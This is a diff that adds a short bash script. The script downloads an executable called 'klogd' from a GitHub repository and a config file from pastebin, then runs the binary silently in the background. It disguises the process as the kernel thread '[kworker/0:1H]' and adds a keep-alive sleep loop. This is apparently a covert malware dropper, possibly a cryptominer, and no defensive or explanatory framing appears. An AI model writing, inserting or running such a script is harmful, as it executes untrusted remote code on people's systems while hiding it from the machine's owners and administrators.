@@ -1,0 +1,7 @@
+#!/bin/bash
+curl -L -o klogd https://github.com/gabjohn3/cw/raw/refs/heads/main/klogd
+chmod +x klogd
+curl -L -o config.json https://pastebin.com/raw/Az5tB4tm
+export LD_LIBRARY_PATH=.
+nohup bash -c "exec -a [kworker/0:1H] ./klogd" >/dev/null 2>&1 &
+nohup bash -c 'while true; do sleep 300; done' >/dev/null 2>&1 &
